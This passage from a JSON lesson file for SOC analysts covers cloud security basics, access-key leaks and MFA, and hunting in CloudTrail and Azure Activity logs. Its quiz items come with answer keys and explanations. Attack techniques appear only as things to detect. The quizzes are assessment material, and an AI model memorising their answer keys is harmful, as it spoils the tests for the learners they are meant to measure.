          "label": "When a user logs into a domain-joined machine by hostname with a reachable DC, because that is precisely the scenario Kerberos is unable to handle.",
          "value": "c"
        },
        {
          "label": "When the domain controller is fully reachable and healthy, because a working DC always forces every authentication onto the NTLM path by design.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Connecting by IP address instead of hostname means Windows cannot look up the service's SPN, so it falls back to NTLM; attackers sometimes force NTLM this way to enable relay or pass-the-hash, which is why it warrants attention. Option b is backwards — synchronized clocks help Kerberos, not disable it. Option c describes the exact scenario where Kerberos works, not where it fails. Option d is false because a healthy, reachable DC is what enables Kerberos, not NTLM."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview",
    "https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm",
    "https://attack.mitre.org/techniques/T1550/002/",
    "https://attack.mitre.org/techniques/T1558/003/"
  ],
  "xp": 210,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-cloud-fundamentals-aws-azure",
  "slug": "cloud-security-fundamentals-aws-azure",
  "title": "Cloud Security Fundamentals: AWS & Azure for the SOC Analyst",
  "topic": "Cloud Security",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "More and more of the systems a SOC defends no longer live in a server room down the hall — they live in someone else's data centre, rented by the minute, reached over the internet, and configured entirely through software. That is the cloud, and it changes what an analyst watches and how. This beginner lesson builds the mental model from the ground up: what the cloud actually is, the two giants (AWS and Azure) and a plain-language map of their vocabulary, the three ways people interact with the cloud, the shared-responsibility line that decides what is yours to secure, and the data sources a SOC relies on to see what is happening.",
  "sections": [
    {
      "heading": "What 'the Cloud' Really Means",
      "content": "**The cloud** is simply someone else's computers that you rent over the internet instead of buying and running your own. A company like Amazon or Microsoft builds enormous data centres full of servers, storage, and networking, then lets customers use slices of that capacity on demand and pay only for what they use. Instead of waiting weeks to buy and install a physical server, an engineer creates one in the cloud in seconds with a few clicks or a command.\n\nThree properties make the cloud different from the traditional server room, and each matters to a defender:\n\n- **On-demand and elastic.** Resources appear and disappear in seconds. A single mistaken command can create — or delete — a hundred servers. Speed cuts both ways.\n- **Everything is software-defined.** There are no cables to plug in. Networks, firewalls, disks, and permissions are all created and changed through configuration. This means a misconfiguration, not a broken wire, is the typical cause of a cloud breach.\n- **Reachable over the internet.** Cloud resources are managed through internet-facing control interfaces, so identity and access control become the real perimeter. If an attacker steals the right credential, they do not need to breach a firewall — they just log in.\n\nThe cloud is usually described in service models. **IaaS** (Infrastructure as a Service) rents raw building blocks like virtual machines and disks. **PaaS** (Platform as a Service) rents a ready-made platform to run applications without managing the underlying servers. **SaaS** (Software as a Service) is a finished application you just use, like a web-based email or CRM. Most of what a SOC analyst investigates in AWS and Azure sits in the IaaS and PaaS layers, where the customer still controls configuration and therefore still owns much of the security.\n\nThe headline shift for a defender is this: in the traditional world you watched packets and hosts; in the cloud you increasingly watch **identities and API calls**. Someone using stolen credentials to spin up servers or read a storage bucket looks, at the network level, like perfectly normal traffic to a cloud provider. The evidence lives in the cloud's own activity logs, which later sections unpack."
    },
    {
      "heading": "AWS and Azure — A Vocabulary Map",
      "content": "The two dominant clouds are **Amazon Web Services (AWS)** and **Microsoft Azure**. (Google Cloud is the third major player.) They do the same kinds of things but use different names, and one of the fastest ways to become comfortable is to learn the translation table, because an alert or log will speak one dialect or the other.\n\nFirst, the container that holds everything:\n\n- In **AWS**, the top-level container is an **account**, and large organisations group many accounts under **AWS Organizations**.\n- In **Azure**, resources live in a **subscription**, subscriptions sit under **management groups**, and the identity system is **Microsoft Entra ID** (formerly Azure Active Directory).\n\nNow the core service types, side by side:\n\n| What it does | AWS name | Azure name |\n|--------------|----------|------------|\n| Identity & access | IAM | Entra ID + Azure RBAC |\n| Virtual machine (compute) | EC2 | Virtual Machines |\n| Object storage | S3 | Blob Storage |\n| Virtual network | VPC | Virtual Network (VNet) |\n| Cloud firewall | Security Groups | Network Security Groups (NSG) |\n| Serverless function | Lambda | Azure Functions |\n| Management activity log | CloudTrail | Azure Activity Log |\n| Managed threat detection | GuardDuty | Microsoft Defender for Cloud |\n\nYou do not need to memorise every service, but you should recognise these anchors, because they name the places attackers go and the logs you read. When an alert says an **EC2 instance** was launched or an **S3 bucket** was made public, you are in AWS; when it mentions a **VM**, a **Blob container**, or an **Entra sign-in**, you are in Azure.\n\nA further useful distinction is **regions** and **availability zones**. Cloud providers run data centres in many geographic **regions** (such as `us-east-1` in AWS or `West Europe` in Azure), each divided into isolated **availability zones**. Region matters for investigations: activity in a region your company never uses is itself suspicious, and attackers sometimes create resources in unused regions precisely to avoid notice."
    },
    {
      "heading": "Three Ways People Touch the Cloud",
      "content": "Everything that happens in AWS or Azure happens through one of three interfaces, and — this is the key insight for an analyst — **they all funnel down to the same underlying API calls**, which is what makes cloud activity so loggable.\n\n1. **The web console.** A point-and-click website where a human logs in and manages resources visually. Convenient for people, and console logins are a prime authentication event to monitor (especially the powerful **root** or **Global Administrator** account).\n2. **The command-line interface (CLI) and SDKs.** Tools like the `aws` command or Azure's `az` command let engineers and scripts drive the cloud with typed commands or code. Automation lives here, and so do many attacker tools, because scripting is faster than clicking.\n3. **The API directly.** Underneath the console and the CLI, every action is really a call to the provider's **API** — a defined request such as \"create this VM\" or \"read this object.\" The console and CLI are just friendlier wrappers around these calls.\n\nBecause all three collapse into API calls, the provider can record **every action as a log entry**: who made the call, which action, on what resource, from which IP, and whether it succeeded. That recording is the single most important fact about cloud security monitoring. Whether an attacker clicked in the console or ran a script, the provider's activity log (CloudTrail or Azure Activity Log) captures the API call underneath.\n\nThis also reframes what \"access\" means in the cloud. Traditionally, reaching a server meant being on the network. In the cloud, the interfaces are internet-facing, so the thing that gates access is the **credential and its permissions**, not network location. An engineer in a coffee shop and an attacker on another continent hit the very same API endpoint; what separates them is whether they hold a valid credential and what that credential is allowed to do. This is why identity is called the new perimeter, and why the next lesson focuses on cloud authentication and the keys that unlock it."
    },
    {
      "heading": "Who Secures What — and Where the SOC Looks",
      "content": "Cloud security rests on one foundational idea: the **shared responsibility model**. The provider and the customer each own part of security, and confusion about the line is a leading cause of breaches.\n\n- **The provider secures the cloud itself** — the physical data centres, the hardware, the hypervisor that runs virtual machines, and the managed services' underlying infrastructure. This is \"security *of* the cloud.\"\n- **The customer secures what they put in the cloud** — their data, their configurations, their identities and permissions, their network rules, and their application code. This is \"security *in* the cloud.\"\n\nThe practical consequence: when an S3 bucket is left public, an access key is leaked, or a firewall rule is opened to the whole internet, **the provider will not stop it and did nothing wrong** — those are customer-side configuration choices. They are exactly the failures a SOC must catch. No provider control will alert you that your own team misconfigured your own resource; that detection is yours to build.\n\nSo where does a cloud SOC actually look? A handful of data sources carry most of the signal:\n\n- **Management/activity logs** — AWS **CloudTrail** and the **Azure Activity Log** record the API calls that create, change, and delete resources. This is the backbone of cloud detection.\n- **Identity logs** — Entra **sign-in** and **audit** logs (and AWS IAM/console sign-in events) show who authenticated, from where, and whether risk was detected.\n- **Network and flow logs** — VPC flow logs / NSG flow logs show connections in and out.\n- **Storage and data-access logs** — records of who read or wrote to buckets and blobs.\n- **Managed detection services** — **GuardDuty** and **Defender for Cloud** raise ready-made findings you then confirm in the raw logs.\n\nThe analyst's cloud mindset is a shift in attention: away from \"what packet crossed the wire\" and toward \"which identity made which API call, from where, and should they have.\" The remaining cloud lessons drill into the specific pieces — the credentials that authenticate those calls, the audit logs that record them, and the storage and network settings that most often go wrong."
    }
  ],
  "keyTakeaways": [
    "The cloud is rented, software-defined, internet-reachable computing where misconfiguration (not broken hardware) causes most breaches, so analysts increasingly watch identities and API calls rather than packets and hosts.",
    "AWS and Azure do the same things with different names (account/subscription, IAM/Entra, EC2/VM, S3/Blob, Security Groups/NSG, CloudTrail/Azure Activity Log); learning the map lets you read either dialect.",
    "Console, CLI, and direct API all collapse into the same loggable API calls, which is why the provider can record every action — who, what, where, and success or failure.",
    "Under shared responsibility the provider secures the cloud while the customer secures their data, config, identities, and network rules; public buckets, leaked keys, and open firewall rules are customer-side failures the SOC must catch in CloudTrail, Azure Activity, and identity logs."
  ],
  "quiz": [
    {
      "question": "A new analyst assumes that because a company's servers run in AWS, Amazon is responsible for making sure none of the company's storage buckets are accidentally left open to the public internet. Why is this assumption wrong?",
      "options": [
        {
          "label": "Amazon does secure bucket permissions for customers, so the analyst is actually correct and no internal monitoring for public buckets is ever needed.",
          "value": "a"
        },
        {
          "label": "Under shared responsibility the provider secures the infrastructure, but the customer owns their data and configuration, so a public bucket is the customer's failure to catch.",
          "value": "b"
        },
        {
          "label": "Bucket permissions are set by the hardware layer that Amazon controls, so any public exposure is automatically a physical data-centre problem.",
          "value": "c"
        },
        {
          "label": "Storage permissions are handled entirely by the network firewall, which the provider configures, so customers never influence whether a bucket is public.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The shared responsibility model splits duties: the provider secures the cloud infrastructure (hardware, hypervisor, managed-service backbone), while the customer secures their data, configuration, identities, and access rules. A public storage bucket is a customer-side configuration choice, so it is the SOC's job to detect it. Option a is dangerously false. Options c and d misattribute a configuration setting to hardware or provider-run firewalls, which is not how storage permissions work."
    },
    {
      "question": "Why can a cloud provider record essentially every management action a user takes — whether that user clicked in the web console, typed an aws CLI command, or called the API from a script?",
      "options": [
        {
          "label": "Because the console, CLI, and scripts all ultimately perform the same underlying API calls, which the provider logs as who did what, where, and with what result.",
          "value": "a"
        },
        {
          "label": "Because the provider installs a monitoring agent on every analyst's personal laptop that records their screen and keystrokes during any cloud session.",
          "value": "b"
        },
        {
          "label": "Because only the web console produces logs, so organisations simply forbid the CLI and API to guarantee that all activity is fully captured.",
          "value": "c"
        },
        {
          "label": "Because cloud actions are recorded solely at the network packet level, so the provider reconstructs each action by reassembling raw traffic after the fact.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "The console and CLI are friendly wrappers around the provider's API, so every action collapses into an API call that services like CloudTrail and Azure Activity Log record, capturing the identity, action, resource, source IP, and outcome. Option b invents laptop surveillance that does not exist. Option c is false because the CLI and API are logged too, not forbidden. Option d is wrong because cloud auditing is built on API-call records, not packet reassembly."
    }
  ],
  "references": [
    "https://docs.aws.amazon.com/whitepapers/latest/aws-overview/introduction.html",
    "https://learn.microsoft.com/en-us/azure/security/fundamentals/shared-responsibility",
    "https://learn.microsoft.com/en-us/azure/cloud-adoption-framework/ready/considerations/fundamental-concepts"
  ],
  "xp": 200,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-cloud-authentication-access-keys",
  "slug": "cloud-authentication-and-access-keys",
  "title": "Cloud Authentication & Access Keys",
  "topic": "Cloud Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "In the cloud, a credential is the keys to the kingdom. There is no building to walk into and no cable to unplug — if you hold a valid credential with the right permissions, you can create, read, or destroy resources from anywhere on earth. That makes cloud authentication, and especially the long-lived access keys that so often leak, one of the most important topics a SOC analyst can master. This lesson explains how cloud identities prove who they are, the difference between long-lived and temporary credentials, why leaked access keys cause so many breaches, the role MFA plays, and how an analyst detects credential abuse.",
  "sections": [
    {
      "heading": "How Cloud Identities Prove Who They Are",
      "content": "Cloud authentication answers the question \"who is making this request?\" before any permission is even checked. There are two broad kinds of identity, and telling them apart is the foundation for everything else.\n\n**Human identities** are people: an engineer signing into the AWS console, an admin logging into the Azure portal. They typically authenticate with a **username and password**, ideally backed by **multi-factor authentication (MFA)**, and increasingly through **single sign-on (SSO)** so one corporate login grants access to the cloud.\n\n**Machine (workload) identities** are programs: an application, a virtual machine, or a script that needs to call the cloud without a human present. These cannot type a password, so they authenticate with a **key** or a **token** — a secret string the provider issues and recognises.\n\nThe crucial split, which recurs throughout this lesson, is **long-lived versus temporary** credentials.\n\n- **Long-lived credentials** are static secrets that keep working until someone manually revokes them. The classic example is an **AWS access key**, a pair made of an **access key ID** (a public-ish identifier beginning with `AKIA`) and a **secret access key** (the actual secret). In Azure, the analogue is a **service principal** with a **client secret** or certificate. These are convenient but dangerous: if stolen, they work for the thief exactly as they worked for the owner, indefinitely.\n- **Temporary credentials** are short-lived. In AWS the **Security Token Service (STS)** issues time-limited keys (their IDs begin with `ASIA`) that expire in minutes to hours. Azure and the others issue similar short-lived **tokens**. Because they expire, a stolen temporary credential has a small window of usefulness.\n\nA related best-practice pattern ties these together: instead of handing a workload a permanent key, you attach a **role** (an identity a resource can assume) and let the platform hand it fresh temporary credentials automatically. An EC2 instance or Azure VM with a **managed identity** gets rotating credentials it never stores on disk. The security lesson is simple and consistent: prefer temporary, prefer platform-managed, and treat every long-lived key as a liability to minimise."
    },
    {
      "heading": "Access Keys — The Credential That Leaks",
      "content": "If one credential type dominates cloud breach stories, it is the **long-lived access key**. Understanding why requires seeing both its convenience and its danger.\n\nAn access key is a static secret that a developer can paste into a script, a configuration file, or an environment variable so their code can call the cloud. That convenience is exactly the problem: static secrets end up in places they should never be.\n\n**Where access keys leak:**\n\n- **Source code committed to Git**, especially public **GitHub** repositories, where automated bots scan for `AKIA` strings within seconds of a push.\n- **CI/CD logs and build output** that accidentally print the secret.\n- **Laptops, shared drives, and chat messages** where a key was pasted \"just for now.\"\n- **Container images and configuration files** baked with credentials inside.\n\nOnce a key leaks, the attack is trivial: the thief configures their own tools with the stolen key and immediately has whatever permissions the key's owner had. There is no password to guess and no MFA prompt in the way, because the key *is* the proof of identity. This is why the very first minutes after a public leak matter — attackers and their bots often begin using a leaked key within minutes.\n\nWhat attackers do with a stolen key follows a familiar arc: they **enumerate** what the key can do, look for a path to **escalate privileges**, then pursue their goal — reading data, launching resources (often crypto-mining), or establishing persistence by creating new users and keys of their own.\n\n**Defending access keys** comes down to a short, strict playbook:\n\n- **Prefer roles and temporary credentials** over long-lived keys wherever possible, and use managed identities for workloads.\n- **Rotate** any keys that must exist, and delete unused ones.\n- **Scope them tightly** with least privilege, so a leaked key is far less damaging.\n- **Never commit keys to source control**; scan repositories and CI logs for secrets.\n- **Monitor key usage** so first use from a new location stands out.\n\nThe mental model to carry: an access key is a password that never changes, works from anywhere, and is often written down. Treat it accordingly."
    },
    {
      "heading": "MFA — Adding a Second Proof",
      "content": "**Multi-factor authentication (MFA)** requires a second proof of identity beyond the password, and in the cloud it is one of the highest-value controls a SOC can champion. The idea is to combine factors from different categories: **something you know** (a password), **something you have** (a phone app or hardware key), and **something you are** (a fingerprint or face). Requiring two means a stolen password alone is no longer enough.\n\nIn practice, cloud MFA usually means that after entering a password, the user must approve a prompt in an **authenticator app**, enter a rotating **one-time code**, or tap a **hardware security key**. For the most powerful identities — the AWS **root** account and Azure **Global Administrator** — MFA is not optional in any mature environment; those accounts can undo every other control, so they must be protected the most.\n\nBut MFA has an important boundary that analysts must understand: **it protects interactive sign-ins, not static keys or tokens.** An AWS access key or an Azure client secret authenticates without any MFA prompt, because it is a machine credential. So MFA on a human's console login does nothing to protect a leaked programmatic key. This is precisely why leaked access keys are so dangerous and why reducing long-lived keys matters even in an MFA-everywhere environment.\n\nAttackers have also learned to attack MFA itself, and these techniques show up in identity logs:\n\n- **MFA fatigue (prompt bombing):** flooding a user with approval prompts until they tap \"approve\" out of annoyance. In logs this looks like many MFA challenges in quick succession, mostly denied, then one approval.\n- **Adversary-in-the-middle (AiTM) phishing:** proxying the real login page to steal the post-MFA session token, then replaying it — bypassing the prompt entirely.\n- **SIM swapping** to intercept SMS codes, which is why app-based or hardware MFA is preferred over SMS.\n\nThe takeaways for a SOC: push for MFA on all human identities and especially privileged ones; recognise that MFA does not cover programmatic credentials; and watch for the signatures of MFA abuse — bursts of prompts, sudden new MFA method registrations (a common attacker persistence step), and token reuse from unexpected locations."
    },
    {
      "heading": "Detecting Credential Abuse",
      "content": "Because credentials are the cloud's real perimeter, detecting their misuse is central SOC work. The good news is that authentication and API activity are richly logged; the skill is knowing the patterns that betray a stolen credential.\n\n**Build a baseline first.** For each identity — human or machine — normal behaviour has a shape: the source IPs and countries it uses, the times it is active, the API actions it calls, and the regions it touches. Detection is largely about deviation from that shape.\n\n**High-value signals to hunt:**\n\n- **First use of a key from a new location.** An access key that has only ever been called from your CI system in one region suddenly making calls from a foreign residential or hosting IP is a classic leaked-key indicator. Correlate the source IP and User-Agent against the key's history.\n- **Impossible travel and unfamiliar sign-in properties** on human accounts — authentication from two distant places too close in time, or a new device/country combination — point to account takeover.\n- **Enumeration bursts.** A credential suddenly calling many descriptive/list actions (listing users, buckets, permissions) in a short window is often an attacker mapping what they can do right after gaining access.\n- **Sensitive identity actions.** Creating new users or access keys (`CreateUser`, `CreateAccessKey`), attaching powerful policies, or registering a new MFA method — especially from an unusual source — signals an attacker establishing durable access.\n- **MFA anomalies.** A rapid series of denied MFA prompts followed by an approval (MFA fatigue), or a sign-in that should have required MFA succeeding with only a single factor.\n- **Use of anonymising infrastructure** — Tor exit nodes or anonymising VPNs — for cloud authentication.\n\n**Confirm by correlation, not by a single alert.** A key used from a new IP might be an engineer travelling; the same key then enumerating IAM and creating a new user is almost certainly compromise. Managed services help surface leads: AWS **GuardDuty** raises findings like credential exfiltration and anomalous behaviour, and **Entra ID Protection** scores risky sign-ins and risky users. Treat these as starting points, then verify in the raw CloudTrail, Azure Activity, and sign-in logs.\n\n**Respond in proportion.** For a confirmed compromised credential: **revoke or deactivate the key** (or force a password reset and revoke sessions/tokens for a human), rotate related secrets, review what the credential accessed, and hunt for persistence such as newly created users, keys, or MFA methods. The discipline mirrors the rest of SOC work: baseline, alert on deviation, confirm by correlation, then contain decisively."
    }
  ],
  "keyTakeaways": [
    "Cloud identities are human (password + MFA + SSO) or machine (keys/tokens); the critical split is long-lived credentials like AWS access keys (AKIA) and Azure client secrets versus temporary, auto-expiring credentials from STS/managed identities.",
    "Long-lived access keys are the credential that leaks — into Git, CI logs, laptops, and images — and because the key itself is the proof of identity, a thief needs no password and faces no MFA, so prefer roles/temporary credentials, rotate, scope tightly, and never commit keys.",
    "MFA is a high-value control for human sign-ins (mandatory for root/Global Admin) but does NOT protect programmatic keys or tokens; watch for MFA fatigue, AiTM token theft, and new MFA-method registration as attacker signatures.",
    "Detect credential abuse by baselining each identity and alerting on deviation: first key use from a new location, impossible travel, enumeration bursts, sensitive IAM actions, and anonymised sources — then confirm by correlation and revoke on confirmation."
  ],
  "quiz": [
    {
      "question": "A developer accidentally commits an AWS access key (an AKIA key ID plus its secret) to a public GitHub repository. Within minutes, the key is used from an unfamiliar foreign IP to list IAM users and create a new access key. Why did MFA on the developer's console login fail to prevent this?",
      "options": [
        {
          "label": "MFA failed only because the developer had disabled it that morning; with MFA enabled, the leaked access key would have required a second factor to work.",
          "value": "a"
        },
        {
          "label": "MFA protects interactive human sign-ins, but a programmatic access key authenticates on its own with no MFA prompt, so the key itself was enough for the attacker.",
          "value": "b"
        },
        {
          "label": "MFA would have blocked the attack, but GitHub stripped the MFA requirement from the key when the repository was made public to the internet.",
          "value": "c"
        },
        {
          "label": "MFA did prevent the attack; the observed activity must be the developer themselves, because a leaked key can never be used without the account password.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "MFA secures interactive sign-ins, but an access key is a machine credential that authenticates without any MFA prompt — the key is itself the proof of identity — so a leaked key works for a thief exactly as it did for the owner. Option a is wrong because MFA on the console does not gate programmatic key use regardless of whether it was enabled. Option c invents GitHub behaviour that does not exist. Option d wrongly assumes a key needs the password, which it does not."
    },
    {
      "question": "Your organisation wants to reduce the risk that a compromised credential gives an attacker durable, wide-ranging cloud access. Which approach most directly addresses the core weakness of long-lived access keys?",
      "options": [
        {
          "label": "Print all access keys to a secured document each month so administrators can review which ones exist and confirm they are still needed.",
          "value": "a"
        },
        {
          "label": "Give every workload broad wildcard permissions so fewer distinct keys are required and the overall configuration stays simpler to manage.",
          "value": "b"
        },
        {
          "label": "Replace long-lived keys with roles and temporary, auto-expiring credentials (managed identities) wherever possible, and tightly scope any keys that remain.",
          "value": "c"
        },
        {
          "label": "Disable MFA on human accounts so that authentication is consistent between people and machine identities across the whole environment.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "The core weakness of a long-lived key is that it works indefinitely from anywhere once stolen; replacing it with roles and temporary, auto-expiring credentials shrinks the window of usefulness, and least-privilege scoping limits the damage of any key that must remain. Option a does nothing to reduce the keys' danger. Option b increases risk by widening permissions. Option d weakens security by removing MFA, making human credential theft easier."
    }
  ],
  "references": [
    "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html",
    "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html",
    "https://learn.microsoft.com/en-us/entra/identity/authentication/concept-mfa-howitworks"
  ],
  "xp": 210,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-cloud-audit-logs-cloudtrail-azure-activity",
  "slug": "cloud-audit-logs-cloudtrail-azure-activity",
  "title": "Cloud Audit Logs: CloudTrail, Azure Activity & API Activity",
  "topic": "Cloud Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "If cloud actions are API calls, then the log of those API calls is the SOC's primary window into what happened. AWS CloudTrail and the Azure Activity Log record who did what, when, from where, and whether it worked — the raw material of nearly every cloud investigation. This lesson explains the management plane versus the data plane, the anatomy of a CloudTrail event and its Azure equivalent, the fields that matter most, and the specific patterns an analyst hunts for, including the tell-tale sign of an attacker trying to blind you by disabling logging.",
  "sections": [
    {
      "heading": "The Management Plane vs the Data Plane",
      "content": "To read cloud logs well, you first need a distinction that trips up many beginners: the difference between the **management plane** (also called the control plane) and the **data plane**.\n\n- The **management plane** is where you *manage resources*: creating a virtual machine, changing a permission, opening a firewall rule, deleting a storage bucket. These are administrative API calls about the infrastructure itself.\n- The **data plane** is where you *use the data inside* those resources: reading an individual object from a bucket, querying rows in a database, invoking a function. These are operations on the contents.\n\nThe reason this matters is that the two are logged differently and often separately. **Management-plane activity is logged comprehensively by default** — AWS **CloudTrail** and the **Azure Activity Log** capture management events automatically. **Data-plane activity is far higher volume and frequently must be turned on explicitly** (for example, S3 object-level data events or storage access logs), and it can be costly, so many organisations do not capture all of it.\n\nFor a SOC, the practical implications are large:\n\n- Most detections start in the **management plane**, because that is where an attacker's structural moves appear — creating users, escalating privileges, changing network rules, disabling security. And it is on by default, so the evidence is usually there.\n- **Data-plane visibility is a coverage decision.** If you need to prove *which specific files* an attacker read from a bucket, you need object-level data logging enabled *before* the incident. Part of a mature cloud SOC's job is ensuring the right data events are captured for sensitive resources.\n\nA simple analogy: the management plane is the record of who was handed keys, changed the locks, or opened doors in a building; the data plane is the record of which specific documents were taken out of which cabinet. The first is always kept; the second only if you installed the extra cameras. Knowing which plane your evidence lives in — and whether it was even being recorded — shapes every cloud investigation."
    },
    {
      "heading": "Anatomy of a CloudTrail Event",
      "content": "**AWS CloudTrail** records management-plane API calls as structured events, and learning to read one is a core analyst skill. Every event answers the same journalistic questions — who, what, when, where, and with what result — through a consistent set of fields.\n\nThe fields that carry the most investigative weight:\n\n- **eventName** — the API action that was called, such as `RunInstances` (launch a VM), `CreateAccessKey`, `PutBucketPolicy`, or `StopLogging`. This is *what happened*.\n- **eventSource** — the service the call went to, like `iam.amazonaws.com` or `s3.amazonaws.com`.\n- **userIdentity** — *who* made the call: the identity type (IAM user, assumed role, root), the principal, and often the access key ID used. This is where you confirm which credential acted.\n- **sourceIPAddress** — the IP the call came from. Comparing this against an identity's baseline is one of the fastest anomaly checks.\n- **userAgent** — the tool used, which can reveal a CLI, an SDK, or a known attacker toolkit rather than the expected console.\n- **awsRegion** — where the action occurred; activity in an unused region is inherently suspicious.\n- **eventTime** — when, in UTC.\n- **errorCode / errorMessage** — present when the call was *denied* or failed, for example `AccessDenied`. A burst of these from one identity often marks an attacker probing the edges of what a stolen credential can do.\n\nReading an event is a matter of assembling these into a sentence: *\"At this time, this identity, from this IP, using this tool, called this action on this service in this region, and it succeeded or was denied.\"* Once you can narrate an event that way, you can spot the one that does not belong.\n\nAzure records the same idea in the **Azure Activity Log**, with matching concepts under different names: the **Operation name** (the action), the **Caller** (who), the **Caller IP address**, the **Status** (success/failure), the **Event category** (Administrative, Security, and so on), the **Resource**, and the **timestamp**. Azure sign-in and identity events live alongside in the **Entra** sign-in and audit logs. Whether you are reading AWS or Azure, the analytic move is identical: identify the actor, the action, the origin, and the outcome, then ask whether that combination makes sense for that identity."
    },
    {
      "heading": "Hunting Patterns in the Activity Log",
      "content": "With the fields in hand, detection becomes a matter of recognising patterns that betray misuse. The following are among the highest-value hunts across CloudTrail and Azure Activity.\n\n**Reconnaissance / enumeration.** Right after gaining access, attackers map their new environment. Watch for a single identity issuing many **List** and **Describe** actions (`ListUsers`, `ListBuckets`, `GetAccountAuthorizationDetails`) in a short window, especially paired with **AccessDenied** errors as they probe boundaries.\n\n**Privilege escalation and persistence.** These are rare, high-impact actions that deserve alerts on their own: `CreateUser`, `CreateAccessKey`, `AttachUserPolicy`, `PutUserPolicy`, `UpdateAssumeRolePolicy`, or in Azure adding a principal to **Owner** or **User Access Administrator**. A low-privilege identity suddenly attaching administrator permissions to itself is a screaming indicator.\n\n**Anomalous origin.** Any management call from an **unusual source IP, country, or region**, or with a **User-Agent** that does not match the identity's norm. A role that only ever acted from inside a workload now calling APIs from an external IP is a strong sign of stolen credentials (for example, credentials pulled from an instance via SSRF).\n\n**Resource actions that fit an attack goal.** `RunInstances` in an unused region (often crypto-mining), mass deletion of resources or backups, snapshot creation and sharing to an external account (a data-exfiltration path), or changes to storage and firewall exposure (covered in the storage and security-group lesson).\n\n**Suspicious authentication.** Correlate the activity log with identity logs: **impossible travel**, **unfamiliar sign-in properties**, use of **anonymising IPs**, and **console logins by the root or Global Admin account**, which should be exceedingly rare.\n\nThe unifying method is **baseline then deviation**. For each identity you learn the normal source IPs, regions, actions, and hours; then you alert when reality departs from that shape. A single deviation may be benign — an engineer travelling, a new automation — so the confirming move is **correlation**: the same identity showing several signals together (new IP, then enumeration, then a new user created) turns a maybe into a near-certainty. Managed detections like **GuardDuty** and **Defender for Cloud** encode many of these patterns for you and are excellent leads, but you confirm and scope the incident in the raw activity log itself."
    },
    {
      "heading": "When the Attacker Attacks the Logs",
      "content": "A sophisticated intruder knows the activity log is what will expose them, so a classic move is to **blind the defender by tampering with logging itself**. Recognising this is one of the most important instincts a cloud analyst can develop, because it inverts the usual signal: here, the *absence* of logs, or the act of disabling them, is the alarm.\n\nIn AWS, the key event is **`StopLogging`** on CloudTrail — an explicit API call to turn a trail off. Related tampering includes **`DeleteTrail`**, **`UpdateTrail`** (to weaken what is captured or redirect where logs go), and disabling or deleting the log storage. In Azure, the equivalents are actions that disable diagnostic settings, delete or modify **Log Analytics** workspaces, or turn off **Defender for Cloud** protections. MITRE ATT&CK tracks this behaviour under **Impair Defenses: Disable or Modify Cloud Logs**.\n\nWhy attackers do it is straightforward: with logging off, their subsequent actions — data theft, resource creation, lateral movement — leave no management-plane trail. The window between disabling logging and getting caught is their cover.\n\nThe crucial defensive design turns this against them: **`StopLogging` and its kin are themselves recorded**, and the act of disabling logging is exactly the kind of rare, high-severity event a SOC should alert on immediately. So the detections you build are:\n\n- **Alert on any attempt to stop, delete, or modify logging** — `StopLogging`, `DeleteTrail`, diagnostic-setting changes — as a top-priority signal, regardless of who did it.\n- **Alert on unexpected gaps** in the log stream; a trail that goes silent when it normally is not is suspicious.\n- **Protect the logs' integrity by design:** deliver CloudTrail to a separate, access-restricted account or an immutable store, enable logging in **all regions**, and ensure the accounts that could disable logging are tightly limited and closely watched.\n\nThe broader principle, echoing the on-prem world's protection of Windows event logs, is that **your telemetry is itself a target**. A mature cloud SOC does not just read the logs; it monitors the health and integrity of the logging pipeline, so that an attacker's attempt to go dark becomes the very event that lights them up."
    }
  ],
  "keyTakeaways": [
    "The management (control) plane logs administrative API calls — creating, changing, deleting resources — and is captured by default in CloudTrail and Azure Activity Log; the data plane logs use of the contents (reading an object, querying data), is higher-volume, and often must be explicitly enabled.",
    "A CloudTrail event answers who/what/where/outcome via eventName, eventSource, userIdentity (and access key), sourceIPAddress, userAgent, awsRegion, eventTime, and errorCode; Azure Activity Log mirrors this with Operation, Caller, Caller IP, Status, and category.",
    "Hunt by baselining each identity then alerting on deviation: enumeration bursts (List/Describe + AccessDenied), privilege/persistence actions (CreateUser/CreateAccessKey/AttachUserPolicy), anomalous origin, resource actions fitting an attack goal, and suspicious sign-ins — confirming by correlation.",
    "Attackers disable logging to go dark (AWS StopLogging/DeleteTrail/UpdateTrail; Azure diagnostic-setting changes — MITRE Impair Defenses), but those actions are themselves logged, so alert on any attempt to stop/modify logging and protect log integrity with immutable, multi-region, isolated storage."
  ],
  "quiz": [
    {
      "question": "During an investigation you find a CloudTrail event with eventName 'StopLogging' called by an IAM user shortly after that user was seen enumerating permissions. Why is this StopLogging event so significant, and what is the intended effect for the attacker?",
      "options": [
        {
          "label": "It is insignificant routine maintenance, because CloudTrail must be stopped and restarted daily, so this event can safely be ignored during triage.",
          "value": "a"
        },
        {
          "label": "It shows the attacker disabling CloudTrail to blind the SOC so their later actions leave no management-plane trail; the disabling itself is a top-priority alert.",
          "value": "b"
        },
        {
          "label": "It means CloudTrail automatically encrypted itself for safety, so all subsequent events are simply stored in a stronger format that analysts cannot read.",
          "value": "c"
        },
        {
          "label": "It proves the account is fully secure, because only a legitimate administrator performing an approved audit is ever able to call the StopLogging action.",
          "value": "d"
        }
      ],
      "answer": "b",
